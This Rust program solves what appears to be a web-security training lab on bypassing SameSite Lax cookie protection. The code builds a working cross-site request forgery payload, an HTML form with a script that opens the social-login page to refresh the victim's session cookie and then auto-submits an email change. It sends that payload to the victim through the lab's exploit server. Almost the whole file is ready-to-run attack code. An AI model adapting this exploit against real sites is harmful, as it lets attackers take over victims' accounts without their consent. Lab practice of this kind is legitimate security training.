/*************************************************************************************
*
* Lab: SameSite Lax bypass via cookie refresh
*
* Hack Steps: 
*      1. Craft an HTML form for changing the email address with a script that opens
*         a new tab to force the victim to refresh their cookie and submit the form
*         after a few seconds to make sure that the redirection occurred
*      2. Deliver the exploit to the victim
*      3. The victim's email will be changed after they trigger the exploit
*
**************************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0ab5002e047c897a80d61733006b00c7.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0a1f005104ac89618017160501950075.exploit-server.net";

fn main() {
    let new_email = "hacked@you.com"; // You can change this to what you want
    let payload = format!(
        r###"<html>
                <body>
                <form action="{LAB_URL}/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="{new_email}" />
                <input type="submit" value="Submit request" />
                </form>
                <script>
                window.onclick = () => {{ 
                    window.open("{LAB_URL}/social-login");
                    setTimeout(() => {{
                        document.forms[0].submit();
                        }}, 3000);
                    }}
                </script>
                </body>
                </html>"###
    );

    print!("{}", "❯❯ Delivering the exploit to the victim.. ",);
    io::stdout().flush().unwrap();

    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The victim's email will be changed after they trigger the exploit");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn deliver_exploit_to_victim(payload: &str) {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    let client = build_web_client();
    client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
